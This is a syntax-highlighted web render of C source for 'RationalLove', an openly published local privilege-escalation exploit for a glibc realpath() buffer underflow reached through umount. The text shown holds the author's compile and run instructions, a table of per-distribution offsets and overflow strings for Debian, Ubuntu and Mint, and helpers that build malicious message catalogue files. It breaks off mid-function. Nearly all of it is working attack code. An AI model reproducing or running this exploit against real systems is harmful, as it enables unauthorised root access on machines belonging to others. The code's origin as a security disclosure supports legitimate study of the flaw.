class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** This software is provided by the copyright owner &quot;as is&quot; and any</span></span><br><span class="line"><span class="comment"> *  expressed or implied warranties, including, but not limited to,</span></span><br><span class="line"><span class="comment"> *  the implied warranties of merchantability and fitness for a particular</span></span><br><span class="line"><span class="comment"> *  purpose are disclaimed. In no event shall the copyright owner be</span></span><br><span class="line"><span class="comment"> *  liable for any direct, indirect, incidential, special, exemplary or</span></span><br><span class="line"><span class="comment"> *  consequential damages, including, but not limited to, procurement</span></span><br><span class="line"><span class="comment"> *  of substitute goods or services, loss of use, data or profits or</span></span><br><span class="line"><span class="comment"> *  business interruption, however caused and on any theory of liability,</span></span><br><span class="line"><span class="comment"> *  whether in contract, strict liability, or tort, including negligence</span></span><br><span class="line"><span class="comment"> *  or otherwise, arising in any way out of the use of this software,</span></span><br><span class="line"><span class="comment"> *  even if advised of the possibility of such damage.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Copyright (c) 2018 halfdog &lt;me (%) halfdog.net&gt;</span></span><br><span class="line"><span class="comment"> *  See https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ for more information.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  This tool exploits a buffer underflow in glibc realpath()</span></span><br><span class="line"><span class="comment"> *  and was tested against latest release from Debian, Ubuntu</span></span><br><span class="line"><span class="comment"> *  Mint. It is intended as demonstration of ASLR-aware exploitation</span></span><br><span class="line"><span class="comment"> *  techniques. It uses relative binary offsets, that may be different</span></span><br><span class="line"><span class="comment"> *  for various Linux distributions and builds. Please send me</span></span><br><span class="line"><span class="comment"> *  a patch when you developed a new set of parameters to add</span></span><br><span class="line"><span class="comment"> *  to the osSpecificExploitDataList structure and want to contribute</span></span><br><span class="line"><span class="comment"> *  them.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Compile: gcc -o RationalLove RationalLove.c</span></span><br><span class="line"><span class="comment"> *  Run: ./RationalLove</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  You may also use &quot;--Pid&quot; parameter, if you want to test the</span></span><br><span class="line"><span class="comment"> *  program on already existing namespaced or chrooted mounts.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UMOUNT_ENV_VAR_COUNT 256</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Dump that number of bytes from stack to perform anti-ASLR.</span></span><br><span class="line"><span class="comment"> *  This number should be high enough to reproducible reach the</span></span><br><span class="line"><span class="comment"> *  stack region sprayed with (UMOUNT_ENV_VAR_COUNT*8) bytes of</span></span><br><span class="line"><span class="comment"> *  environment variable references but low enough to avoid hitting</span></span><br><span class="line"><span class="comment"> *  upper stack limit, which would cause a crash.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_LONG_DUMP_BYTES 4096</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *messageCataloguePreamble=<span class="string">&quot;Language: en\n&quot;</span></span><br><span class="line">    <span class="string">&quot;MIME-Version: 1.0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Content-Type: text/plain; charset=UTF-8\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Content-Transfer-Encoding: 8bit\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The pid of a namespace process with the working directory</span></span><br><span class="line"><span class="comment"> *  at a writable /tmp only visible by the process. */</span></span><br><span class="line"><span class="keyword">pid_t</span> namespacedProcessPid=<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> killNamespacedProcessFlag=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The pathname to the umount binary to execute. */</span></span><br><span class="line"><span class="keyword">char</span> *umountPathname;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The pathname to the named pipe, that will synchronize umount</span></span><br><span class="line"><span class="comment"> *  binary with supervisory process before triggering the second</span></span><br><span class="line"><span class="comment"> *  and last exploitation phase.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span> *secondPhaseTriggerPipePathname;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The pathname to the second phase exploitation catalogue file.</span></span><br><span class="line"><span class="comment"> *  This is needed as the catalogue cannot be sent via the trigger</span></span><br><span class="line"><span class="comment"> *  pipe from above.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span> *secondPhaseCataloguePathname;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The OS-release detected via /etc/os-release. */</span></span><br><span class="line"><span class="keyword">char</span> *osRelease=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** This table contains all relevant information to adapt the</span></span><br><span class="line"><span class="comment"> *  attack to supported Linux distros (fully updated) to support</span></span><br><span class="line"><span class="comment"> *  also older versions, hash of umount/libc/libmount should be</span></span><br><span class="line"><span class="comment"> *  used also for lookups.</span></span><br><span class="line"><span class="comment"> *  The 4th string is an array of 4-byte integers with the offset</span></span><br><span class="line"><span class="comment"> *  values for format string generation. Values specify:</span></span><br><span class="line"><span class="comment"> *  * Stack position (in 8 byte words) for **argv</span></span><br><span class="line"><span class="comment"> *  * Stack position of argv[0]</span></span><br><span class="line"><span class="comment"> *  * Offset from __libc_start_main return position from main()</span></span><br><span class="line"><span class="comment"> *    and system() function, first instruction after last sigprocmask()</span></span><br><span class="line"><span class="comment"> *    before execve call.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ED_STACK_OFFSET_CTX 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ED_STACK_OFFSET_ARGV 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ED_STACK_OFFSET_ARG0 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ED_LIBC_GETDATE_DELTA 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ED_LIBC_EXECL_DELTA 4</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* osSpecificExploitDataList[]=&#123;</span><br><span class="line"><span class="comment">// Debian Stretch</span></span><br><span class="line">    <span class="string">&quot;\&quot;9 (stretch)\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A&quot;</span>,</span><br><span class="line">    <span class="string">&quot;from_archive&quot;</span>,</span><br><span class="line"><span class="comment">// Delta for Debian Stretch &quot;2.24-11+deb9u1&quot;</span></span><br><span class="line">    <span class="string">&quot;\x06\0\0\0\x24\0\0\0\x3e\0\0\0\x7f\xb9\x08\x00\x4f\x86\x09\x00&quot;</span>,</span><br><span class="line"><span class="comment">// Ubuntu Xenial libc=2.23-0ubuntu9</span></span><br><span class="line">    <span class="string">&quot;\&quot;16.04.3 LTS (Xenial Xerus)\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_nl_load_locale_from_archive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00&quot;</span>,</span><br><span class="line"><span class="comment">// Linux Mint 18.3 Sylvia - same parameters as &quot;Ubuntu Xenial&quot;</span></span><br><span class="line">    <span class="string">&quot;\&quot;18.3 (Sylvia)\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_nl_load_locale_from_archive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> **osReleaseExploitData=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Locate the umount binary within the given search path list,</span></span><br><span class="line"><span class="comment"> *  elements separated by colons.</span></span><br><span class="line"><span class="comment"> *  @return a pointer to a malloced memory region containing the</span></span><br><span class="line"><span class="comment"> *  string or NULL if not found.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">findUmountBinaryPathname</span><span class="params">(<span class="keyword">char</span> *searchPath)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *testPathName=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(PATH_MAX);</span><br><span class="line">  assert(testPathName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(*searchPath) &#123;</span><br><span class="line">    <span class="keyword">char</span> *endPtr=<span class="built_in">strchr</span>(searchPath, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">int</span> length=endPtr-searchPath;</span><br><span class="line">    <span class="keyword">if</span>(!endPtr) &#123;</span><br><span class="line">      length=<span class="built_in">strlen</span>(searchPath);</span><br><span class="line">      endPtr=searchPath+length<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> result=<span class="built_in">snprintf</span>(testPathName, PATH_MAX, <span class="string">&quot;%.*s/%s&quot;</span>, length,</span><br><span class="line">        searchPath, <span class="string">&quot;umount&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(result&gt;=PATH_MAX) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Binary search path element too long, ignoring it.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      struct stat statBuf;</span><br><span class="line">      result=stat(testPathName, &amp;statBuf);</span><br><span class="line"><span class="comment">// Just assume, that umount is owner-executable. There might be</span></span><br><span class="line"><span class="comment">// alternative ACLs, which grant umount execution only to selected</span></span><br><span class="line"><span class="comment">// groups, but it would be unusual to have different variants</span></span><br><span class="line"><span class="comment">// of umount located searchpath on the same host.</span></span><br><span class="line">      <span class="keyword">if</span>((!result)&amp;&amp;(S_ISREG(statBuf.st_mode))&amp;&amp;(statBuf.st_mode&amp;S_IXUSR)) &#123;</span><br><span class="line">        <span class="keyword">return</span>(testPathName);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    searchPath=endPtr+<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(testPathName);</span><br><span class="line">  <span class="keyword">return</span>(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Get the value for a given field name.</span></span><br><span class="line"><span class="comment"> *  @return NULL if not found, a malloced string otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">getReleaseFileField</span><span class="params">(<span class="keyword">char</span> *releaseData, <span class="keyword">int</span> dataLength, <span class="keyword">char</span> *fieldName)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> nameLength=<span class="built_in">strlen</span>(fieldName);</span><br><span class="line">  <span class="keyword">while</span>(dataLength&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">char</span> *nextPos=<span class="built_in">memchr</span>(releaseData, <span class="string">&#x27;\n&#x27;</span>, dataLength);</span><br><span class="line">    <span class="keyword">int</span> lineLength=dataLength;</span><br><span class="line">    <span class="keyword">if</span>(nextPos) &#123;</span><br><span class="line">      lineLength=nextPos-releaseData;</span><br><span class="line">      nextPos++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      nextPos=releaseData+dataLength;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(releaseData, fieldName, nameLength))&amp;&amp;</span><br><span class="line">        (releaseData[nameLength]==<span class="string">&#x27;=&#x27;</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span>(strndup(releaseData+nameLength+<span class="number">1</span>, lineLength-nameLength<span class="number">-1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    releaseData=nextPos;</span><br><span class="line">    dataLength-=lineLength;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Detect the release by reading the VERSION field from /etc/os-release.</span></span><br><span class="line"><span class="comment"> *  @return 0 on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">detectOsRelease</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> handle=open(<span class="string">&quot;/etc/os-release&quot;</span>, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span>(handle&lt;<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *buffer=alloca(<span class="number">1024</span>);</span><br><span class="line">  <span class="keyword">int</span> infoLength=read(handle, buffer, <span class="number">1024</span>);</span><br><span class="line">  close(handle);</span><br><span class="line">  <span class="keyword">if</span>(infoLength&lt;<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">  osRelease=getReleaseFileField(buffer, infoLength, <span class="string">&quot;VERSION&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!osRelease)</span><br><span class="line">    osRelease=getReleaseFileField(buffer, infoLength, <span class="string">&quot;NAME&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(osRelease) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Detected OS version: %s\n&quot;</span>, osRelease);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Create the catalogue data in memory.</span></span><br><span class="line"><span class="comment"> *  @return a pointer to newly allocated catalogue data memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">createMessageCatalogueData</span><span class="params">(<span class="keyword">char</span> **origStringList, <span class="keyword">char</span> **transStringList,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">int</span> stringCount, <span class="keyword">int</span> *catalogueDataLength)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> contentLength=<span class="built_in">strlen</span>(messageCataloguePreamble)+<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> stringPos=<span class="number">0</span>; stringPos&lt;stringCount; stringPos++) &#123;</span><br><span class="line">    contentLength+=<span class="built_in">strlen</span>(origStringList[stringPos])+</span><br><span class="line">        <span class="built_in">strlen</span>(transStringList[stringPos])+<span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> preambleLength=(<span class="number">0x1c</span>+<span class="number">0x14</span>*(stringCount+<span class="number">1</span>)+<span class="number">0xc</span>)&amp;<span class="number">-0xf</span>;</span><br><span class="line">  <span class="keyword">char</span> *catalogueData=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(preambleLength+contentLength);</span><br><span class="line">  <span class="built_in">memset</span>(catalogueData, <span class="number">0</span>, preambleLength);</span><br><span class="line">  <span class="keyword">int</span> *preambleData=(<span class="keyword">int</span>*)catalogueData;</span><br><span class="line">  *preambleData++=<span class="number">0x950412de</span>;</span><br><span class="line">  preambleData++;</span><br><span class="line">  *preambleData++=stringCount+<span class="number">1</span>;</span><br><span class="line">  *preambleData++=<span 